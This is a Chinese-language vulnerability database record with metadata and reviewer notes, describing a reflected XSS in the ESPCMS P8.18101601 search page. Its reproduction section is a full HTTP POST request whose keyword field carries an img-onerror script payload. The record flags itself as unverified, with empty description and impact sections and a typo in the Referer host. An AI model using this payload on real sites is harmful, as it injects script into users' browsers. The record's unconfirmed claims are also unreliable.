---
source: "hatch 补库批 20260928"
product: "ESPCMS P8.18101601"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ESPCMS 反射型xss"
prerequisites: "来源所述条件，未列明部分仍待核：搜索页面反射输出；未给有效登录态"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7c16dd8b7baa3184de07ca20"
entity_id: "ve-7c16dd8b7baa3184de07ca20"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：搜索页面反射输出；未给有效登录态

- **证据待核（1）**：简介空白，只有请求，无输出上下文或执行证据。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **凭据与会话边界（2）**：Referer主机0-sec.org8拼写；Cookie为示例残留；缺原始来源及修复信息。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ESPCMS 前台反射型xss

一、漏洞简介
------------

二、漏洞影响
------------

ESPCMS P8.18101601

三、复现过程
------------

    POST /index.php?ac=Search&at=List HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 46
    Origin: https://www.0-sec.org
    Connection: close
    Referer: https://www.0-sec.org8/index.php?ac=Search&at=List
    Cookie: zerosec; 

    mid=0&keyword="><img src=1 onerror=alert(1)><"
